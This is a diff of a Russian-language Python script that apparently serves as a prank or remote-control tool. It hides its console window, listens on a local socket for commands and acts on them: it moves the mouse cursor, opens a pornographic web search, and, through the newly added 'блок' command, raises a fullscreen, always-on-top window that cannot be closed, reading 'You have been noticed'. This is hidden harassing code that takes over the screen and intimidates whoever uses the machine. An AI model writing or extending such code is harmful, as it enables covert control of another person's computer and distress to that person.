@@ -7,9 +7,11 @@ import tkinter as tk
 from tkinter import messagebox
 import subprocess
 import webbrowser
-import multiprocessing
 import shutil
 import sys
+
+window_67 = None
+window_block = None
 
 ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
@@ -113,6 +115,7 @@ def handle_client(client_socket):
     client_socket.close()
 
 def execute_command(cmd):
+    global window_67, window_block
     if cmd == "курсор":
         move_cursor(500, 500)
         time.sleep(1)
@@ -180,21 +183,41 @@ def execute_command(cmd):
         url = f"https://www.google.com/search?q=18+ с обезьянами смотреть бесплатно"
         webbrowser.open(url)
     elif cmd == "67":
-        root = tk.Tk()
-        root.title("67")
-        root.geometry("400x300")
-        label = tk.Label(root, text="67", foreground="white", background="blue", font=("Arial", 35))
-        label.pack(pady=20)
-        root.mainloop()
+        if window_67 is None or not window_67.winfo_exists():
+            window_67 = tk.Toplevel()
+            window_67.title("67")
+            window_67.geometry("400x300")
+            label = tk.Label(window_67, text="67", foreground="white", background="blue", font=("Arial", 35))
+            label.pack(pady=20)
+    elif cmd == "блок":
+        if window_block is None or not window_block.winfo_exists():
+            window_block = tk.Toplevel()
+            window_block.title("Блок")
+            window_block.geometry("1980x1200")
+            window_block.attributes("-fullscreen", True)
+            window_block.attributes("-topmost", True)
+            window_block.protocol("WM_DELETE_WINDOW", lambda: None)
+            label = tk.Label(window_block, text="Вас заметили 👁", foreground="white", background="black", font=("Arial", 50))
+            label.pack(expand=True, fill=tk.BOTH)
     else:
         win_error("сообщение", f"{cmd}")
+
+root = tk.Tk()
+root.withdraw()
+
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(('localhost', 8888))
 server.listen(5)
 print("Сервер запущен, ожидает команд...")
 
-while True:
+def start_server():
+ while True:
     client, addr = server.accept()
     print(f"Подключение от {addr}")
     client_handler = threading.Thread(target=handle_client, args=(client,))
     client_handler.start()
+
+server_thread = threading.Thread(target=start_server, daemon=True)
+server_thread.start()
+
+root.mainloop()
